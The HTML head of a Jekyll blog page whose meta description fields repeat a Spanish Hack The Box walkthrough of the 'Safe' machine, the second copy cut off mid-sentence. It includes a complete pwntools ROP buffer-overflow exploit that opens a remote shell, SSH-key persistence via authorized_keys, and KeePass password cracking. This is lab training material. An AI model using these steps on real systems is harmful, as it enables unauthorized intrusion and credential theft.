<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Safe - Hack The Box</title>

  <link rel="shortcut icon" href="/assets/favicon.ico">
  <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Safe - Hack The Box | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Safe - Hack The Box" />
<meta name="author" content="m4teo" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hoy vamos a resolver la máquina Safe de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.147 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.147 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.147 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: p - Escanea todo el rango de puertos (65535 en total) open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat v - Verbose, reporta lo encontrado por consola n - No aplicar resolución DNS sS - Escaneo TCP SYN min-rate - Emitir paquetes no más lentos que &lt;valor&gt; por segundo vvv - Triple verbose, para obtener mayor información por consola Pn - No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 22,80,1337 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: sC - Scripts básicos de enumeración sV - Versión y servicios que corren bajo los puertos encontrados p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con HTTP; asimismo, encontramos abierto el puerto 1337, relacionado con el protocolo WASTE, el cual permite el intercambio de archivos de forma cifrada. Debido a que la máquina cuenta con el puerto 80 abierto, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.147 Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor Apache, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor Apache, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer Ctrl + U. Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que myapp, alojado en el puerto 1337, lo podemos descargar; para ello, podemos intentar añadir /myapp, al final del url. Los comentarios en HTML, siempre tienen la siguiente estructura: &lt;!-- Este es un comentario a modo de prueba --&gt; Al añadir /myapp, al final del url, se nos va a descargar un archivo que lleva por nombre, myapp, el cual vamos a empezar a analizar. Fase De Explotación Lo primero que debemos hacer, es saber que es myapp, para ello podemos usar el comando file. file myapp Nos damos cuenta de que el archivo myapp, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace: chmod 744 myapp Al ejecutar el binario myapp, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando strings, sin embargo, no hay nada interesante. Lo siguiente que podríamos intentar, sería realizar un Buffer Overflow, para ello, cuándo el binario myapp, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga. Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de Python. python -c &#39;print &quot;A&quot;*365&#39; Si nos percatamos, al introducir nuestra cadena de 365 letras A, el binario myapp, deja de funcionar como debería, esto se debe a un Segmentation Fault (Fallo de Segmentación), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros? Cuando el programa myapp, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el buffer, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe. La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el buffer, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente. El concepto de Buffer Overflow puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de GDB, herramienta que nos permitirá depurar el binario myapp. Concretamente estaré haciendo uso de GEF (GDB Enhanced Features), el cual es una extensión para GDB, así como lo es PEDA (Python Exploit Development Assistance). Si queremos instalar GEF, podemos seguir las instrucciones dadas por la página oficial, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente: pip3 install capstone unicorn keystone-engine ropper wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh chmod 744 gefInstall.sh ./gefInstall.sh rm gefInstall.sh Ya con GEF instalado podemos empezar a depurar el binario myapp. gdb myapp run Algo importante a mencionar, antes de empezar el análisis con GEF, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar Buffer Overflow, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de 64 bits, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (RBP, RSP, RIP), en caso de que el sistema fuera de 32 bits, el nombre de los registros empezaría por ‘E’ (EBP, ESP, EIP), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo. Para explotar un Buffer Overflow satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro RIP o EIP (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro RIP, para ello debemos calcular su offset. Sobre el mensaje Cannot disassemble from $PC, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro RSP, el cual, si nos percatamos, está lleno de letras A; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro RSP. Haciendo uso de GEF, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente: gdb myapp pattern create run pattern offset $rsp Sabemos ahora que, después de ingresar 120 bytes, empezaremos a sobrescribir el registro RSP, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, 8 letras B, por ejemplo. python -c &#39;print &quot;A&quot;*120 + &quot;B&quot;*8&#39; gdb myapp run En efecto, al ingresar 120 bytes, empezamos a sobrescribir el RSP, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de checksec, esto podemos hacerlo tanto dentro de GEF, como fuera de él. gdb myapp checksec checksec myapp Podemos observar que el DEP (Data Execution Prevention), o NX (No-Execute), está activado; esta protección nos impedirá ejecutar código a través del stack, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario myapp, podemos explotarlo, a este concepto se lo conoce como ROP (Return Oriented Programming). Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar ingeniería inversa sobre el binario, para hacerlo, haremos uso de Ghidra, una suite de herramientas dedicada a la ingeniería inversa, desarrollada por la NSA. Para descargar Ghidra, ingresaremos aquí, y descargaremos la versión más reciente. unzip &lt;archivoQueHayamosDescargado&gt; cd &lt;carpetaQueSeHayaCreado&gt; ./ghidraRun Presionaremos File, New Project, Non-Shared Project, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos File, Import File, seleccionamos el binario myapp, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar. Ya en este punto podemos empezar a analizar que hay dentro del binario myapp, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú Functions, que se encuentra al lado izquierdo, podemos empezar por analizar la función main. Si nos percatamos, esto es lo que encontramos cuando ejecutamos myapp; nos damos cuenta de que se está definiendo una variable de nombre local_78 que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando uptime. Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función gets(), una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a uptime, podríamos conseguir una consola dentro de la máquina víctima. Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función test, y el concepto de ROP. No obstante, vamos a analizar el binario myapp, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en Python, para lo cual empezaremos por colocar la cabecera de Python 3, importar la librería pwntools, y definir tanto la arquitectura como el sistema operativo de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; En caso de no contar con la librería pwntools, podemos hacer lo siguiente: apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando uptime, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un breakpoint en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de What do you want me to echo back?, caso contrario, el script se cerrará. p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, &#39;b *0x40116e&#39;) p.recvuntil(&quot;What do you want me to echo back?&quot;) La dirección de la llamada al sistema, la podemos sacar de Ghidra: Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes: chmod 744 &lt;nuestroScript.py&gt; En este punto podemos presionar la tecla c, para continuar, y nos daremos cuenta que el comando uptime, está siendo almacenado en el registro RDI. En este punto, tenemos que buscar una forma de sobrescribir el registro RDI, y la clave está en la función test Si nos percatamos, en la dirección 0x401156, el contenido que se encuentra en el registro RSP, está siendo almacenado en el registro RDI; ¿cuándo almacenábamos las 8 letras B, en qué registro las estábamos almacenando? Exacto, en RSP, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función test, para que cuando esta termine, podamos ejecutar el comando que deseemos. Sin embargo, hay un pequeño problema, en la siguiente instrucción, 0x401159, se está efectuando un jump a R13, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en RDI. La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en R13? Esto lo haremos haciendo uso de gadgets, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa. Haciendo uso de nuestro script, escribiremos ahora ropper, lo cual nos permitirá listar todos los gadgets dentro del binario. Vemos que se nos lista un total de 99 gadgets, de los cuales nos interesa pop, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el gadget pop. ropper --search &quot;pop&quot; Observamos, que tenemos una opción que nos permite hacer un pop a R13, aunque esta va seguida de pops a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan. Ya con toda esta información, es posible finalmente, explotar el binario myapp, haciendo uso de Buffer Overflow, Return Oriented Programming y gadgets, por lo que regresaremos a nuestro script en Python. Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un breakpoint a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será popR13, la cual va a valer la dirección en la que se aplica este gadget; la segunda será system, la cual va a valer la dirección de la llamada al sistema; la tercera será test, la cual va a valer la dirección de la función test. La dirección de la función test, la podemos sacar de Ghidra: popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) Es importante tener en cuenta que, en todo momento, estamos trabajando en 64 bits. Por otra parte, vamos a empezar por definir el número de letras A que queremos introducir, previo a desbordar el buffer, esto lo vamos a almacenar en una variable de nombre junk, eso si, deberemos de codificar la variable en formato bytes. junk = (&quot;A&quot;*112).encode() Si nos percatamos, estamos introduciendo 112 letras A, y no 120, porque ciertamente el buffer se desborda con 112 bytes, como pudimos ver con Ghidra, no obstante, para poder empezar a sobrescribir registros tenemos que introducir 120 bytes como vimos con GEF, pues estamos frente a un sistema operativo de 64 bits, por lo que necesitamos de 8 bytes para insertar un valor en el stack, en caso de estar en un sistema operativo de 32 bits, necesitaríamos de 4 bytes. Entonces, la variable local_78 ciertamente tiene una longitud máxima de 112 bytes, sin embargo, necesitamos de 8 bytes más, para desbordar satisfactoriamente el buffer, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro RSP, pero hasta que no introduzcamos como mínimo 120 bytes, no vamos a conseguir un Segmentation Fault, razón por la cual, si al binario myapp, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa. Lo que nos interesa ahora, es sobrescribir el registro RSP con nuestro código malicioso, de modo que este pase al registro RSI, de modo que cuando se ejecute la función jump hacia la dirección de la llamada al sistema, nos ejecute nuestro código. Concretamente vamos a ejecutar el comando /bin/sh en adición de un null byte por si nos da problemas, la longitud total de esta cadena es de 8 bytes, (7 en /bin/sh, más el del null byte) por lo que estaríamos desbordando el buffer, e ingresando esta cadena en el registro RSP. La siguiente variable por definir será binSh, la cual, como mencionamos, valdrá el comando /bin/sh en adición de un null byte, y al igual que la variable junk, deberemos codificarla; la última variable que definiremos será, nullByte, la cual usaremos para asignar valores nulos a las direcciones R14 y R15. binSH = &quot;/bin/sh\x00&quot;.encode() nullByte = p64(0x0) Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte What do you want me to echo back?, para hacer esto tendremos que hacer uso de p.sendline(), dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden. p.sendline(junk + binSH + popR13 + system + null + null + test) En primer lugar estamos introduciendo una cadena de 112 bytes, posteriormente introducimos nuestro código malicioso que suma una longitud de 8 bytes, de modo que estaríamos ya, sobrescribiendo el registro RSP, que se convertirá en RSI, posteriormente, haremos una llamada al gadget pop, al cual le pasaremos como argumentos lo que nos solicita, la dirección de R13, R14, R15 y RET, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función test, redirigiendo así, el flujo del programa a través de esa función. Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar. p = remote(&quot;10.10.10.147&quot;, 1337) Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente: p.interactive() Nuestro script, debería verse algo así: #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; # p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, &#39;b *0x40116e&#39;) # p.recvuntil(&quot;What do you want me to echo back?&quot;) p = remote(&quot;10.10.10.147&quot;, 1337) popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) junk = (&quot;A&quot;*112).encode() binSh = &quot;/bin/sh\x00&quot;.encode() nullByte = p64(0x0) p.sendline(junk + binSh + popR13 + system + nullByte + nullByte + test) p.interactive() Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios. find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user. Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión .kdbx, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo. Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por SSH a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre authorized_keys ubicado en la carpeta .ssh, dentro del directorio del usuario user. Lo primero que haremos será crear un par de claves SSH, una pública, y una privda, esto lo haremos haciendo uso de ssh-key. cd ~/.ssh/ ssh-keygen En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves SSH, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta /home/user/.ssh/authorized_keys. echo &quot;nuestraClavePública&quot; &gt;&gt; /home/user/.ssh/authorized_keys Una vez hecho esto, podemos conectarnos a través de SSH a la máquina víctima. ssh user@10.10.10.147 En vista de que estamos conectados a la máquina vía SSH, podríamos intentar transferir los archivos del directorio /home/user/, haciendo uso de SCP (Secure Copy Protocol), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante Busybox, y posteriormente, descargando las imágnes a través de Wget. scp &quot;user@10.10.10.147:/home/user/*&quot; . Una vez tengamos tanto las imágenes como el archivo MyPasswords.kdbx en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con esteganografía, ya que si abrimos el archivo MyPasswords.kdbx con keepassxc, nos pregunta por un archivo clave. En caso de no contar con keepassxc instalado, podemos hacer lo siguiente: sudo apt install keepassxc Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo MyPasswords.kdbx, no obstante, primero tendremos que pasar de formato KeePass, a formato john, para crackear la contraseña haciendo uso de John the Ripper, de modo que usaremos keepass2john. Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a keepass2john, mediante el parámetro -k. Esto se vería algo así: keepass2john -k &lt;imagenDeseada&gt; MyPasswords.kdbx Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un bucle for, para ir iterando sobre cada imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx; done Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos john, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue MyPasswords, lo cual no nos es de ayuda, por lo que podemos reemplazar MyPasswords, por el nombre de la imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx | sed &quot;s/MyPasswords/$image/&quot;; done &gt;&gt; nombreArchivo Finalmente, para crackear la contraseña, haremos uso de john en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john sudo john --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo MyPasswords.kdbx. Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag." />
<meta property="og:description" content="Hoy vamos a resolver la máquina Safe de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.147 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.147 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.147 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: p - Escanea todo el rango de puertos (65535 en total) open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat v - Verbose, reporta lo encontrado por consola n - No aplicar resolución DNS sS - Escaneo TCP SYN min-rate - Emitir paquetes no más lentos que &lt;valor&gt; por segundo vvv - Triple verbose, para obtener mayor información por consola Pn - No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 22,80,1337 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: sC - Scripts básicos de enumeración sV - Versión y servicios que corren bajo los puertos encontrados p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con HTTP; asimismo, encontramos abierto el puerto 1337, relacionado con el protocolo WASTE, el cual permite el intercambio de archivos de forma cifrada. Debido a que la máquina cuenta con el puerto 80 abierto, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.147 Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor Apache, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor Apache, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer Ctrl + U. Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que myapp, alojado en el puerto 1337, lo podemos descargar; para ello, podemos intentar añadir /myapp, al final del url. Los comentarios en HTML, siempre tienen la siguiente estructura: &lt;!-- Este es un comentario a modo de prueba --&gt; Al añadir /myapp, al final del url, se nos va a descargar un archivo que lleva por nombre, myapp, el cual vamos a empezar a analizar. Fase De Explotación Lo primero que debemos hacer, es saber que es myapp, para ello podemos usar el comando file. file myapp Nos damos cuenta de que el archivo myapp, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace: chmod 744 myapp Al ejecutar el binario myapp, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando strings, sin embargo, no hay nada interesante. Lo siguiente que podríamos intentar, sería realizar un Buffer Overflow, para ello, cuándo el binario myapp, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga. Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de Python. python -c &#39;print &quot;A&quot;*365&#39; Si nos percatamos, al introducir nuestra cadena de 365 letras A, el binario myapp, deja de funcionar como debería, esto se debe a un Segmentation Fault (Fallo de Segmentación), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros? Cuando el programa myapp, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el buffer, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe. La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el buffer, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente. El concepto de Buffer Overflow puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de GDB, herramienta que nos permitirá depurar el binario myapp. Concretamente estaré haciendo uso de GEF (GDB Enhanced Features), el cual es una extensión para GDB, así como lo es PEDA (Python Exploit Development Assistance). Si queremos instalar GEF, podemos seguir las instrucciones dadas por la página oficial, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente: pip3 install capstone unicorn keystone-engine ropper wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh chmod 744 gefInstall.sh ./gefInstall.sh rm gefInstall.sh Ya con GEF instalado podemos empezar a depurar el binario myapp. gdb myapp run Algo importante a mencionar, antes de empezar el análisis con GEF, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar Buffer Overflow, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de 64 bits, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (RBP, RSP, RIP), en caso de que el sistema fuera de 32 bits, el nombre de los registros empezaría por ‘E’ (EBP, ESP, EIP), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo. Para explotar un Buffer Overflow satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro RIP o EIP (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro RIP, para ello debemos calcular su offset. Sobre el mensaje Cannot disassemble from $PC, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro RSP, el cual, si nos percatamos, está lleno de letras A; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro RSP. Haciendo uso de GEF, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente: gdb myapp pattern create run pattern offset $rsp Sabemos ahora que, después de ingresar 120 bytes, empezaremos a sobrescribir el registro RSP, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, 8 letras B, por ejemplo. python -c &#39;print &quot;A&quot;*120 + &quot;B&quot;*8&#39; gdb myapp run En efecto, al ingresar 120 bytes, empezamos a sobrescribir el RSP, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de checksec, esto podemos hacerlo tanto dentro de GEF, como fuera de él. gdb myapp checksec checksec myapp Podemos observar que el DEP (Data Execution Prevention), o NX (No-Execute), está activado; esta protección nos impedirá ejecutar código a través del stack, por lo que no tendrá sentido redirigir el 